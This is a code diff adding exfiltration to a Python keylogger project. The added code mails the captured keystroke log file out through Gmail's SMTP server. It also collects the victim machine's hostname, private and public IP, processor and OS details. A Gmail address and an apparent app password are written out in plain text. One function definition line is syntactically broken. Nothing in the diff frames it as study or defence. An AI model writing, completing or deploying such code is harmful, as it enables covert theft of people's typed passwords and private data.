@@ -29,8 +29,78 @@ from PIL import ImageGrab
 from scipy.stats import false_discovery_control
 
 keys_information = "key_log.txt"
-file_path = "C:\\Users\\LENOVO\\PycharmProjects\\PythonProject\\Project"
+system_information = "systeminfo.txt"
+
+email_address = ("wonlypans@gmail.com")
+password = ("llry gujd xclh gamt")
+
+toaddr = "wonlypans@gmail.com"
+
+file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
+
 extend = "\\"
+
+def send_email(filename, attachment, toaddr):filename
+
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log file"
+
+    body = "Hello World!"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload(attachment.read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open (file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get('https://api.ipify.org').text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Public IP Address: None")
+
+        f.write("Processor : " + (platform.processor()) + '\n')
+        f.write("System  : " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine  : " + platform.machine() + '\n')
+        f.write("Hostname  : " + socket.gethostname() + '\n')
+        f.write("Private IP  : " + IPAddr + '\n')
+
+computer_information()
 
 count = 0
 keys = []
